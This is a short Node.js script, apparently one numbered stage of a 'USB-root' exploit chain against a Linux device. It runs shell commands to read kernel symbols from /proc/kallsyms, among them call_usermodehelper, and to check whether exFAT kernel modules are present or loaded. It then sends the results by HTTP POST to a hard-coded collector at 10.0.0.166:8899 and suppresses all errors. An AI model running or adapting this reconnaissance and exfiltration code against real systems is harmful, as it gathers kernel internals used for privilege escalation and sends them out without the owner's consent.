// Stage-16: kernel symbols + exFAT module availability for USB-root port.
var fs = require('fs');
var http = require('http');
var cp = require('child_process');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon16', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
function ex(c) { try { return cp.execSync(c, { timeout: 15000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
out.kallsyms_head = ex('head -5 /proc/kallsyms');
out.kallsyms_umh = ex('grep -E "call_usermodehelper|schedule_timeout_uninterruptible|sfd|uep" /proc/kallsyms | head');
out.modules = ex('ls /lib/modules/ 2>/dev/null; find /lib/modules -name "*exfat*" -o -name "*exFAT*" 2>/dev/null | head');
out.exfat_loaded = ex('grep -i exfat /proc/modules');
post(out);
